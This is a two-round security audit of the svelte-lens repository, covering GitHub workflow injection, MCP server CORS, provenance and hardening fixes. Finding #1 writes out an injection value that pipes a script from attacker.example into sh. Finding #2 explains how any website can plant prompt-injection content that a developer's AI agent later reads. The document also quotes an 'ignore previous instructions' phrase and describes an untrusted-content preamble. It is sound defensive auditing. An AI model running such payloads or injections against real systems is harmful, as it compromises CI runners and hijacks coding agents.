# Security Audit — svelte-lens monorepo

**Date**: 2026-05-25
**Scope**: `gear-null/svelte-lens` repository (all branches), published `@gear-null/svelte-lens@1.0.0`, all CI/CD workflows, repo settings.
**Note**: the repository has since moved to `squid-quarters/svelte-lens` (the old name redirects). The `1.0.1` provenance attestation records `github.com/gear-null/svelte-lens` because it was built before the transfer.
**Methodology**: dependency audit (`pnpm audit`), workflow injection patterns, git history secret scan, source-code review of DOM-touching/IO/IPC paths, MCP server review, CLI review, supply-chain review (provenance + signatures), repo-settings review.

---

## Severity legend

- 🔴 **Critical** — exploitable now, high impact (data loss, RCE, supply-chain compromise)
- 🟠 **High** — exploitable under common conditions or significant integrity/availability risk
- 🟡 **Medium** — requires unusual conditions or limited blast radius
- 🟢 **Low** — defense-in-depth, hygiene, future-proofing
- ℹ️ **Info** — observation, no action required

---

## Findings summary

| #   | Sev | Area           | Title                                                                                 |
| --- | --- | -------------- | ------------------------------------------------------------------------------------- |
| 1   | 🔴  | CI/CD          | Script injection via `${{ inputs.version }}` in `smoke-test.yml`                      |
| 2   | 🔴  | Runtime        | MCP `/context` endpoint accepts requests from any origin (`*` CORS) on localhost      |
| 3   | 🔴  | Supply chain   | Published `@gear-null/svelte-lens@1.0.0` has **no provenance attestation**            |
| 4   | 🟠  | Runtime        | Auto-init runs on every import — no production guard                                  |
| 5   | 🟠  | Runtime        | MCP `--stdio` mode also opens HTTP server with `*` CORS (likely a bug)                |
| 6   | 🟠  | Runtime        | MCP `/context` accepts unbounded request body — memory-DoS                            |
| 7   | 🟠  | CI/CD          | Third-party actions pinned to mutable tags, not commit SHAs                           |
| 8   | 🟠  | Repo settings  | Dependabot **security** updates disabled                                              |
| 9   | 🟠  | Repo settings  | Secret scanning + push protection disabled (free for public repos)                    |
| 10  | 🟡  | Dependency     | `element-source` declares license **"Proprietary"** — license-compatibility ambiguity |
| 11  | 🟡  | Dependency     | `element-source` is at `^0.0.5`, transitively pulls `bippy` (React internals hack)    |
| 12  | 🟡  | CI/CD          | `Summarize release` step interpolates `publishedPackages` JSON directly into shell    |
| 13  | 🟡  | Runtime        | `window.__SVELTE_LENS__` is writable; any 3rd-party script can replace the API        |
| 14  | 🟡  | Runtime        | `svelte-lens:init` CustomEvent leaks API reference to any page listener               |
| 15  | 🟡  | Runtime        | HTML preview not escaped — values reach clipboard / MCP store unescaped               |
| 16  | 🟡  | Runtime        | Plugin `setOptions` enumerates `Object.entries` — possible prototype-pollution vector |
| 17  | 🟡  | Runtime        | MCP `sessions` Map has no cap or TTL — memory growth                                  |
| 18  | 🟡  | Functional+Sec | CLI templates write `import("svelte-lens")` (deprecated name) instead of scoped pkg   |
| 19  | 🟡  | CI/CD          | `pnpm install` runs without `--ignore-scripts` — postinstall RCE via lockfile changes |
| 20  | 🟢  | CI/CD          | Workflow-level `permissions:` block instead of job-scoped                             |
| 21  | 🟢  | Runtime        | MCP health check uses `localhost` not `127.0.0.1` (DNS-resolution surface)            |
| 22  | 🟢  | Dependency     | `zod@^3.23.0` (v4.4.3 latest), `prompts@2.4.2` low-maintenance                        |
| 23  | ℹ️  | Detection      | CLI `hasSvelteLensInDeps` only checks old unscoped names                              |

**Total**: 23 findings (3 critical, 6 high, 11 medium, 3 low, 0 info-only)

---

## 1. 🔴 Script injection in `smoke-test.yml`

**Location**: `.github/workflows/smoke-test.yml`

```yaml
- name: Resolve target version
  run: |
    if [ -n "${{ inputs.version }}" ]; then
      VERSION="${{ inputs.version }}"
    ...
- name: Install from npm
  run: |
    npm install @gear-null/svelte-lens@${{ steps.version.outputs.version }}
```

**Impact**: A user with `Actions: write` permission triggering `workflow_dispatch` can pass:

```
1.0.0"; curl https://attacker.example/x.sh | sh; #
```

…which is interpolated **directly into the shell command**, executing arbitrary code on the GitHub Actions runner. The runner has read access to repo contents, the `GITHUB_TOKEN`, and any other env at the time. While restricted to actors with workflow-trigger permission, this is the canonical workflow-injection pattern (CWE-77 / CWE-78).

**Remediation**: assign the input to an env var first, then use `$VERSION_INPUT` in the shell:

```yaml
- name: Resolve target version
  id: version
  env:
    VERSION_INPUT: ${{ inputs.version }}
    RELEASE_TAG: ${{ github.event.release.tag_name }}
  run: |
    if [ -n "$VERSION_INPUT" ]; then
      VERSION="$VERSION_INPUT"
    elif [ -n "$RELEASE_TAG" ]; then
      VERSION="${RELEASE_TAG##*@}"
    else
      VERSION="latest"
    fi
    # Validate format
    case "$VERSION" in
      [0-9]*.[0-9]*.[0-9]*|[0-9]*.[0-9]*.[0-9]*-*|latest) ;;
      *) echo "Invalid version format: $VERSION"; exit 1 ;;
    esac
    echo "version=$VERSION" >> "$GITHUB_OUTPUT"
```

For `npm install @gear-null/svelte-lens@${{ steps.version.outputs.version }}`, also move to env-var indirection. The output value comes from the validated branch above, so trusted, but still: never interpolate template expressions into shell when you can avoid it.

---

## 2. 🔴 MCP server CORS allows any origin

**Location**: `packages/svelte-lens/src/mcp/server.ts:90`

```ts
response.setHeader("Access-Control-Allow-Origin", "*");
```

The MCP HTTP server binds to `127.0.0.1` (good — local-only) but advertises `Access-Control-Allow-Origin: *` for all responses, including `/context` (POST) and `/mcp`.

**Impact**: While the MCP server is running on a developer's machine, **any website** loaded in the developer's browser can:

1. POST to `http://127.0.0.1:5174/context` with a malicious `{ content, prompt }` payload.
2. The attacker-controlled content sits in `latestContext` until the dev's AI agent calls `get_element_context`.
3. The agent receives a tool result that begins with `Prompt: <attacker text>` followed by `<attacker HTML>` framed as legitimate dev context.
4. Classic indirect prompt injection — the agent now has attacker-supplied "context" to act on.

The `/mcp` endpoint is similarly exposed: any origin can establish an MCP session and read whatever context is stored.

**Remediation** (in order of strength):

1. **Token-gated**: generate a per-instance shared secret on startup, print it to stdout for the dev's MCP config, and require it as a header on `/context` and `/mcp`.
2. **Origin-checked**: reject requests whose `Origin` header isn't on an allowlist (e.g. `http://localhost:*`, `http://127.0.0.1:*`, `null`). Drop `Access-Control-Allow-Origin: *` and reflect only allowlisted origins.
3. **HTTP middleware**: refuse external `Origin:` headers entirely; allow only `Origin: null` (no-CORS fetches from local files) or specific Vite dev-server origins.

**Also**: the MCP SDK's `StreamableHTTPServerTransport` may require a CORS allowance for the mcp-session-id header — verify the chosen mitigation doesn't break the inspector.

---

## 3. 🔴 Published v1.0.0 has no provenance attestation

**Verification**:

```bash
$ curl -s "https://registry.npmjs.org/@gear-null%2Fsvelte-lens/latest" | jq '.dist.attestations'
null
```

The `publishConfig.provenance: true` is set in `package.json`, but the **first publish was done locally** (before OIDC CI was wired up). npm CLI requires an OIDC token to mint a provenance attestation — when published from a local terminal, no attestation is generated, despite the option being set.

**Impact**: users running `npm install @gear-null/svelte-lens` see no provenance icon. The `1.0.0` tarball is unverifiable against any source/build chain. Any compromised maintainer machine could've published it with no audit trail.

**Remediation**:

1. Add a changeset bumping to `1.0.1` (e.g. via the CHANGELOG heading fix below).
2. Merge it; let the Version PR + Release workflow run.
3. The Release workflow uses `changesets/action@v1` with OIDC and `NPM_CONFIG_PROVENANCE: true` — `1.0.1` will have a proper attestation.
4. Update the README to recommend `>= 1.0.1` for users who want supply-chain verification.
5. Optionally run `npm deprecate @gear-null/svelte-lens@1.0.0 "no provenance attestation; please upgrade to >= 1.0.1"`.

---

## 4. 🟠 Auto-init on every module import (no env guard)

**Location**: `packages/svelte-lens/src/index.ts:91`

```ts
if (typeof window !== "undefined" && !window.__SVELTE_LENS_DISABLED__) {
  ...
  globalApi = init();
  window.dispatchEvent(new CustomEvent("svelte-lens:init", { detail: globalApi }));
}
```

Importing `@gear-null/svelte-lens` runs `init()` and hooks global keyboard / pointer / contextmenu listeners. There is no `process.env.NODE_ENV !== 'production'` or similar guard.

**Impact**: if a user accidentally bundles svelte-lens into a production build (treeshake failure, side-effectful import, SSR import that ends up shipped), every visitor's browser:

- Has `window.__SVELTE_LENS__` exposed (an attack surface — see finding #13).
- Has a `keydown` capture-phase listener that intercepts `Cmd+Alt+G` (and `Cmd+C` while the lens is active).
- Has a `pointermove` capture-phase listener throttled at 32 ms.

The README recommends `if (dev)` gating, but a defense-in-depth guard inside the library would prevent footguns:

```ts
const isProd = typeof process !== "undefined" && process.env?.NODE_ENV === "production";
const explicitlyEnabled = window.__SVELTE_LENS_FORCE_ENABLE__ === true;
if (isProd && !explicitlyEnabled) return;
```

(`process.env.NODE_ENV` is replaced at build time by Vite/Rollup/webpack — defaults to `"production"` for production builds in all major bundlers.)

---

## 5. 🟠 MCP `--stdio` mode also opens HTTP server

**Location**: `packages/svelte-lens/src/mcp/server.ts:181-188`

```ts
if (stdio) {
  const mcpServer = createMcpServer();
  const transport = new StdioServerTransport();
  await mcpServer.server.connect(transport);
  startHttpServer(port).then(...);  // <-- ALSO starts HTTP, even in stdio mode
  return;
}
```

This appears to be unintended. The user's MCP client (Claude Desktop, Cursor, Windsurf) speaks stdio over a child process — the HTTP server is unnecessary and combined with finding #2 (open CORS) is a vulnerability.

**Remediation**: gate `startHttpServer` on a separate flag, default to off in stdio mode, or remove the dual-mode entirely:

```ts
if (stdio) {
  const mcpServer = createMcpServer();
  const transport = new StdioServerTransport();
  await mcpServer.server.connect(transport);
  return;
}
await startHttpServer(port);
```

---

## 6. 🟠 MCP `/context` accepts unbounded request body

**Location**: `packages/svelte-lens/src/mcp/server.ts:108-110`

```ts
const chunks: Buffer[] = [];
for await (const chunk of request) chunks.push(chunk as Buffer);
```

A malicious or buggy client can stream gigabytes; the loop allocates Buffers until OOM. Combined with finding #2, an attacker website can exhaust the developer's MCP-server process memory.

**Remediation**:

```ts
const MAX_BODY = 1 * 1024 * 1024; // 1 MB
let total = 0;
const chunks: Buffer[] = [];
for await (const chunk of request) {
  total += (chunk as Buffer).length;
  if (total > MAX_BODY) {
    response.writeHead(413).end(JSON.stringify({ error: "Payload too large" }));
    return;
  }
  chunks.push(chunk as Buffer);
}
```

---

## 7. 🟠 Third-party actions pinned to mutable tags

**Locations**: all `.github/workflows/*.yml`

```yaml
- uses: actions/checkout@v4
- uses: pnpm/action-setup@v4
- uses: actions/setup-node@v4
- uses: changesets/action@v1
- uses: actions/upload-artifact@v4
- uses: actions/download-artifact@v4
```

`v4` and `v1` are mutable tags. Action authors (or attackers who compromise their accounts) can re-point them to malicious code. For an OIDC-publishing workflow, a compromised `changesets/action@v1` could exfiltrate the OIDC mint token to publish backdoored packages.

OpenSSF Scorecard **requires SHA pinning** for high-trust workflows.

**Remediation**: pin to commit SHAs and let dependabot bump them. Example:

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- uses: pnpm/action-setup@a3252b78c470c02df07e9d59298aecedc3ccdd6d # v3.0.0
- uses: changesets/action@e2f8e964d0... # v1.4.7
```

Dependabot's `package-ecosystem: github-actions` (already configured) will keep these up to date with proper SHA bumps.

---

## 8. 🟠 Dependabot security updates disabled

```bash
$ gh api repos/gear-null/svelte-lens
"dependabot_security_updates": "disabled"
```

Even though `.github/dependabot.yml` is configured for **version** updates, **security** updates require a separate toggle (`Settings → Security → Code security and analysis → Dependabot security updates`). Without it, GHSA advisories on direct or transitive deps don't auto-PR.

**Remediation**: enable via UI or API:

```bash
gh api repos/gear-null/svelte-lens \
  -X PATCH \
  -F security_and_analysis[dependabot_security_updates][status]=enabled
```

---

## 9. 🟠 Secret scanning + push protection disabled

```bash
"secret_scanning": "disabled"
"secret_scanning_push_protection": "disabled"
```

Both are free for public repos. Without them:

- Accidentally committed npm tokens / GitHub PATs are not detected post-commit.
- Pushes containing detected secrets aren't blocked at the gateway.

**Remediation**:

```bash
gh api repos/gear-null/svelte-lens \
  -X PATCH \
  -F security_and_analysis[secret_scanning][status]=enabled \
  -F security_and_analysis[secret_scanning_push_protection][status]=enabled
```

---

## 10. 🟡 `element-source` declares "Proprietary" license

```bash
$ npm view element-source license
Proprietary
```

`@gear-null/svelte-lens` is published under MIT, with `element-source@^0.0.5` as a runtime dependency. MIT permits redistribution under different licenses, but a proprietary direct dep:

- Creates ambiguity about the effective license bundle a user gets.
- Could expose downstream users to license-compliance issues (most enterprise SCA tools flag "Proprietary" in dep tree).

**Remediation**:

1. Open an issue at the upstream `element-source` repo asking for a clear OSS license (the README likely intends MIT but the package.json says Proprietary).
2. As a temporary mitigation, document the dep tree in the README and clarify that `element-source` is required at runtime and inherits its author's license terms.
3. Consider vendoring just the source-resolution helper if upstream is unresponsive (small enough).

---

## 11. 🟡 `element-source@^0.0.5` → `bippy@^0.5.32` transitive

`element-source` is at the same author as react-grab (`abai`), at a 0.0.x version. It pulls `bippy` (transitive) — described on its homepage as **"hack into react internals"**. A Svelte library shipping a React-internals dep is unusual and signals that the source-resolution layer reuses React-shaped fiber-walking logic.

**Impact**:

- 0.0.x versioning means the API has zero stability promises.
- A single maintainer at 0.0.x version pinning is a supply-chain bus-factor risk.
- Any `bippy` future change could break source resolution unexpectedly.

**Remediation**:

1. Pin `element-source` to an exact version (no caret) so dependabot bumps trigger explicit review:
   ```json
   "element-source": "0.0.5"
   ```
2. Add a smoke test in the post-release workflow that exercises source resolution against a known fixture.
3. Plan a vendoring/replacement if the upstream stalls.

---

## 12. 🟡 `Summarize release` interpolates JSON into shell

**Location**: `.github/workflows/release.yml:62-66`

```yaml
- name: Summarize release
  if: steps.changesets.outputs.published == 'true'
  run: |
    echo '${{ steps.changesets.outputs.publishedPackages }}' >> $GITHUB_STEP_SUMMARY
```

The output is a JSON array generated by `changesets/action`. While the source is trusted, the interpolation pattern is the same anti-pattern as finding #1. If `publishedPackages` ever contained a `'` it would terminate the single-quoted string and fall into shell.

**Remediation**:

````yaml
- name: Summarize release
  if: steps.changesets.outputs.published == 'true'
  env:
    PUBLISHED: ${{ steps.changesets.outputs.publishedPackages }}
  run: |
    {
      echo "## Released packages"
      echo '```json'
      printf '%s' "$PUBLISHED"
      echo
      echo '```'
    } >> "$GITHUB_STEP_SUMMARY"
````

---

## 13. 🟡 `window.__SVELTE_LENS__` is writable

**Location**: `packages/svelte-lens/src/index.ts:67`

```ts
window.__SVELTE_LENS__ = api;
```

Any 3rd-party script loaded in the page (analytics, ads, browser extensions) can replace `window.__SVELTE_LENS__` with a malicious shim. Subsequent calls to `getGlobalApi()` (used by `registerPlugin` / `unregisterPlugin`) trust the global. A malicious shim could log every `transformCopyContent` invocation, exfiltrating the user's source code via the clipboard.

**Remediation**: define the property as non-writable + non-configurable:

```ts
Object.defineProperty(window, "__SVELTE_LENS__", {
  value: api,
  writable: false,
  configurable: false,
  enumerable: true,
});
```

(`dispose()` then needs to flip back via re-defineProperty before deleting; small refactor.)

---

## 14. 🟡 `svelte-lens:init` CustomEvent leaks API

**Location**: `packages/svelte-lens/src/index.ts:97`

```ts
window.dispatchEvent(new CustomEvent("svelte-lens:init", { detail: globalApi }));
```

Any script with `addEventListener("svelte-lens:init", e => e.detail.copyElement(document.body))` can drive the lens. In dev mode this is acceptable. In production (per finding #4), it's an unauthenticated control surface.

**Remediation**: gate behind env guard from #4. Do not dispatch in production.

---

## 15. 🟡 HTML preview not escaped

**Location**: `packages/svelte-lens/src/utils/format-html-preview.ts:23-26`

```ts
parts.push(value ? ` ${name}="${valueText}"` : ` ${name}`);
...
parts.push(` class="${truncateString(classValue, 60)}"`);
```

The function builds a string that **looks like** HTML (`<button class="...">text</button>`). Attribute values and inner text are inserted via template literal without escaping `&`, `<`, `>`, `"`, or `'`. If the page DOM contains an attribute like `aria-label='" onclick=evil() "'`, the resulting "preview" string would contain the unescaped value.

**Impact**:

- The preview is copied to clipboard and pasted into:
  - AI agent chats (interpreted as text — safe)
  - Markdown editors that render inline HTML (could XSS the editor preview)
  - The MCP `/context` endpoint (consumed by agents — can cause prompt injection if the user-controlled DOM text contains "ignore previous instructions...")
- Not a privilege-escalation vuln but a content-integrity issue.

**Remediation**: HTML-escape values:

```ts
const esc = (s: string) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

parts.push(value ? ` ${name}="${esc(valueText)}"` : ` ${name}`);
```

---

## 16. 🟡 Plugin `setOptions` prototype-pollution surface

**Location**: `packages/svelte-lens/src/core/plugin-registry.svelte.ts:88-94`

```ts
for (const [optionKey, optionValue] of Object.entries(updates)) {
  if (optionValue !== undefined) {
    (directOptionOverrides as Record<string, unknown>)[optionKey] = optionValue;
  }
}
```

If `updates` was constructed via `JSON.parse('{"__proto__": {...}}')`, `Object.entries` would yield `__proto__` as a real key, and the assignment would replace the prototype of `directOptionOverrides`.

The likelihood is low (callers normally pass object literals where `__proto__` is interpreted as the prototype-setter, not enumerable), but defense-in-depth is cheap:

```ts
for (const [optionKey, optionValue] of Object.entries(updates)) {
  if (optionKey === "__proto__" || optionKey === "constructor" || optionKey === "prototype")
    continue;
  if (optionValue !== undefined)
    (directOptionOverrides as Record<string, unknown>)[optionKey] = optionValue;
}
```

Or use `Map<string, unknown>` instead of a plain object.

---

## 17. 🟡 MCP `sessions` Map has no cap or TTL

**Location**: `packages/svelte-lens/src/mcp/server.ts:79`

```ts
const sessions = new Map<string, McpSession>();
// added on every successful POST /mcp init
// removed only on transport.onclose
```

A misbehaving (or malicious) client can repeatedly initialize sessions and never close them. The map grows unboundedly. Each session holds an `McpServer` + `StreamableHTTPServerTransport`, which retain Node streams and event listeners.

**Remediation**:

```ts
const MAX_SESSIONS = 100;
const SESSION_TTL_MS = 30 * 60 * 1000; // 30 min

if (sessions.size >= MAX_SESSIONS) {
  // evict oldest
  const oldest = sessions.keys().next().value;
  if (oldest) {
    const s = sessions.get(oldest);
    s?.transport.close?.();
    sessions.delete(oldest);
  }
}
```

Plus an idle-TTL sweep on a `setInterval`.

---

## 18. 🟡 CLI templates write deprecated package name

**Location**: `packages/svelte-lens/src/cli/utils/templates.ts`

```ts
export const SVELTEKIT_LAYOUT_BLOCK = `
  ...
    onMount(() => {
      if (dev) import("svelte-lens");
    });
  ...
`.trim();
export const VITE_SVELTE_IMPORT = `if (import.meta.env.DEV) {\n  import("svelte-lens");\n}`;
```

The CLI installs the new scoped name (`@gear-null/svelte-lens`) via `installPackages` but writes `import("svelte-lens")` into the user's `+layout.svelte`. `svelte-lens` on npm is now **deprecated** and points to the wrong package. Users will:

1. Install the right package.
2. See a deprecation warning at install time.
3. End up with a `+layout.svelte` that imports the deprecated package.
4. Get a broken dev experience until they manually fix the import string.

This is primarily functional but also a security issue: typosquat candidates could register `svelte-lens` on a private registry and the CLI would happily import their code.

**Remediation**: search/replace `"svelte-lens"` → `"@gear-null/svelte-lens"` in `templates.ts`. Same for the regex in `transform.ts:fileContainsLensImport` and `detect.ts:hasSvelteLensInDeps`.

---

## 19. 🟡 `pnpm install` runs without `--ignore-scripts` in CI

All workflow jobs run `pnpm install --frozen-lockfile`. Postinstall scripts of any dep can execute arbitrary code on the runner. With `--frozen-lockfile`, the lockfile is what's audited — but a malicious PR (from a fork) can change `pnpm-lock.yaml` to introduce a backdoored package.

**Mitigation tradeoff**:

- `--ignore-scripts`: blocks all postinstall hooks. Can break legitimate builds (e.g. native modules, husky). Need to manually re-run for whitelisted packages.
- Recommended for the **release** and **publish** workflows specifically.

**Remediation**:

```yaml
- run: pnpm install --frozen-lockfile --ignore-scripts
- run: pnpm rebuild esbuild # explicitly allow specific packages if needed
```

Plus `pnpm.onlyBuiltDependencies` in root `package.json` to allowlist what may run scripts.

---

## 20. 🟢 Workflow-level permissions instead of job-scoped

**Location**: `.github/workflows/release.yml`, `version.yml`

```yaml
permissions:
  id-token: write
  contents: write
```

The permission block is at the top of the file (workflow-level). Today both files have a single job, so functionally identical. Best practice is to move `permissions:` onto each job (or default to `permissions: {}` at workflow level and grant per-job).

**Remediation**:

```yaml
permissions: {}
jobs:
  release:
    permissions:
      id-token: write
      contents: write
    ...
```

---

## 21. 🟢 MCP health check uses `localhost`

**Location**: `packages/svelte-lens/src/mcp/server.ts:67`

```ts
await fetch(`http://localhost:${port}/health`, ...)
```

The server binds to `127.0.0.1` but probes `localhost`. If `/etc/hosts` has been mutated (or in containerized/network-namespaced environments), `localhost` may resolve elsewhere. Inconsistency between bind and probe is a hygiene issue.

**Remediation**: `http://127.0.0.1:${port}/health` for the probe.

---

## 22. 🟢 Lagging deps: `zod@^3`, `prompts@2.4.2`

| Package       | Current | Latest | Risk                                                                                |
| ------------- | ------- | ------ | ----------------------------------------------------------------------------------- |
| `zod`         | `^3.23` | `4.4`  | Major version behind. v4 has perf + DX improvements; bump for maintenance.          |
| `prompts`     | `2.4.2` | n/a    | Maintenance status uncertain; consider `@clack/prompts` or `inquirer` for new code. |
| `@types/node` | `22`    | `25`   | Dev-only. Node 22 LTS in CI still supported.                                        |
| `typescript`  | `5.9`   | `6.0`  | Dev-only. Wait for ecosystem catch-up before bumping.                               |

**Remediation**: schedule a non-urgent maintenance PR. Dependabot weekly updates already configured.

---

## 23. ℹ️ CLI `hasSvelteLensInDeps` only checks old names

**Location**: `packages/svelte-lens/src/cli/utils/detect.ts:79`

```ts
const hasSvelteLensInDeps = (deps): boolean => Boolean(deps?.["svelte-lens"] ?? deps?.["sv-lens"]);
```

Doesn't check `@gear-null/svelte-lens`. After v1.0.0 rename, the CLI thinks the lens is never installed, so `init --yes` always re-runs the install + script-merge. Functional regression from the consolidation refactor.

**Remediation**:

```ts
const KNOWN_NAMES = ["@gear-null/svelte-lens", "svelte-lens", "sv-lens"];
const hasSvelteLensInDeps = (deps) => KNOWN_NAMES.some((n) => deps?.[n]);
```

---

## Recommended remediation order

**Immediate (this week):**

1. Fix workflow injection (#1) — single PR, small diff
2. Lock down MCP CORS (#2) + size limit (#6) + stdio HTTP fix (#5) — single PR
3. Enable secret scanning + push protection + dependabot security (#8, #9) — repo settings, no PR
4. Cut `1.0.1` from CI to get provenance attestation (#3)

**Short-term (next 2 weeks):**

5. Pin actions to SHAs (#7) and let dependabot manage
6. Production guard in auto-init (#4)
7. HTML-escape preview output (#15)
8. Fix CLI templates (#18) and detection (#23) — same PR as #4

**Medium-term (next month):**

9. Lock down `window.__SVELTE_LENS__` (#13) + remove init custom event in prod (#14)
10. Resolve `element-source` license (#10) + pin (#11)
11. MCP session capping (#17)
12. `pnpm install --ignore-scripts` in CI (#19)

**Hygiene (rolling):**

13. Move permissions to job-level (#20)
14. Health check uses `127.0.0.1` (#21)
15. Update deps (#22)
16. Prototype-pollution guard in setOptions (#16)
17. Summary step env-var indirection (#12)

---

## Out of scope / not assessed

- **Browser extension surface** (none — library-only).
- **OS-level keychain / clipboard provider security** — relies on browser implementation.
- **Vite dev-server `__open-in-editor` middleware** — upstream Vite, not svelte-lens.
- **MCP SDK internals** (`@modelcontextprotocol/sdk`) — assumed safe for this audit; would need a separate review.
- **Sigstore / Fulcio / Rekor** specifics of provenance — not yet generated for v1.0.0.

---

## Tools / commands run

```bash
pnpm audit --prod             # 0 vulnerabilities
pnpm audit                    # 1 low (cookie<0.7.0 in @sveltejs/kit)
git log --all -p | grep -E "<secret patterns>"  # clean (no real secrets)
gh api repos/gear-null/svelte-lens               # security features status
npm view @gear-null/svelte-lens                  # provenance check
grep -r "innerHTML|eval|new Function|exec(" packages/svelte-lens/src
```

Generated by manual review on 2026-05-25.

---

# Round 2 — follow-up audit (2026-06-10)

Full-project re-review after the round-1 remediation PRs (#11, #14, #16, #17, #18, #19) merged. Methodology: STRIDE + OWASP Top 10:2021 + OWASP LLM Top 10 over every source file, workflow, and manifest; `pnpm audit`; npm registry provenance check; repo settings review.

## Round-1 status

- Fixed and verified: #1, #2, #4, #5, #6, #7, #12, #13, #14, #15, #16, #17, #18, #19, #20, #21, #23.
- Fixed via repo settings: #8, #9 (dependabot security updates, secret scanning + push protection now enabled).
- Fixed by release: #3 — `@gear-null/svelte-lens@1.0.1` was published from `.github/workflows/release.yml` (tag `@gear-null/svelte-lens@1.0.1`) with an SLSA v1 provenance attestation (verify: `npm view @gear-null/svelte-lens@1.0.1 dist.attestations`). `1.0.0` stays unattested; optionally `npm deprecate @gear-null/svelte-lens@1.0.0 "no provenance attestation; upgrade to >= 1.0.1"`.
- Still open: #10 (`element-source` license still unclear upstream), #22 (rolling maintenance).
- Note on #11: `^0.0.5` is semantically exact for a `0.0.x` version (caret cannot move the leftmost non-zero digit), so no pinning change is required.

## Round-2 findings

| #   | Sev | Area    | Title                                                                                                                   | Status |
| --- | --- | ------- | ----------------------------------------------------------------------------------------------------------------------- | ------ |
| 24  | 🟠  | Runtime | `init()` has no production-build guard (misconfiguration blast radius)                                                  | fixed  |
| 25  | 🟡  | Runtime | MCP session Map leaks one slot per closed session → 503 after `MAX_SESSIONS` (DoS)                                      | fixed  |
| 26  | 🟢  | Runtime | MCP `get_element_context` returns page-derived content without untrusted-data framing                                   | fixed  |
| 27  | 🟢  | CI/CD   | `release.yml` injects long-lived `NPM_TOKEN` even on the OIDC trusted-publishing path                                   | fixed  |
| 28  | 🟢  | CI/CD   | `smoke-test.yml` reads `github.event.release.tag_name` (empty in `workflow_run`) — post-publish version check never ran | fixed  |

### 24. 🟠 No production guard in `init()`

Round 1 removed auto-init (#4) but left `init()` unguarded: a consumer that calls `init()` without `if (dev)` gating ships capture-phase keyboard/pointer listeners, `window.__SVELTE_LENS__`, and the copy/open surface to end users. `init()` now bails (with a console warning) when `process.env.NODE_ENV === "production"` unless `window.__SVELTE_LENS_FORCE_ENABLE__ === true`. The literal `process.env.NODE_ENV` is preserved in the published build so consumer bundlers replace it statically; environments without a bundler treat the build as non-production.

### 25. 🟡 MCP session slot leak (CWE-772)

`transport.onclose` captured the session storage key before the SDK assigned `transport.sessionId` (which happens during the initialize request), so close events deleted the reservation placeholder instead of the real entry. Every session ever closed leaked a Map slot; after 32 lifetime sessions the server answered 503 for all new MCP sessions until restart. The key is now resolved at close time, re-registration of a closed transport is guarded, and the shutdown sweep skips reservation placeholders.

### 26. 🟢 Untrusted-content framing for agent context (OWASP LLM01)

`get_element_context` output now wraps page-derived content in `---BEGIN/END PAGE CONTEXT---` markers with an explicit do-not-follow-instructions preamble, reducing the chance an agent treats third-party/user-generated DOM text as instructions. Marker spoofing by hostile content remains possible — this is hardening, not isolation.

### 27. 🟢 `NPM_TOKEN` scope in `release.yml` (CWE-522)

`NODE_AUTH_TOKEN` is now only populated for `workflow_dispatch` emergency publishes; release-event publishes rely solely on OIDC trusted publishing. The variable stays defined (empty) so setup-node's `.npmrc` env substitution keeps working.

### 28. 🟢 Smoke test version pinning

The `workflow_run` payload has no `release` context, so `RELEASE_TAG` was always empty and the post-publish "verify installed version matches" step was silently skipped (the test always exercised `latest`). The version is now derived from `github.event.workflow_run.head_branch`, which carries the release tag for release-triggered runs and still passes the semver allowlist.
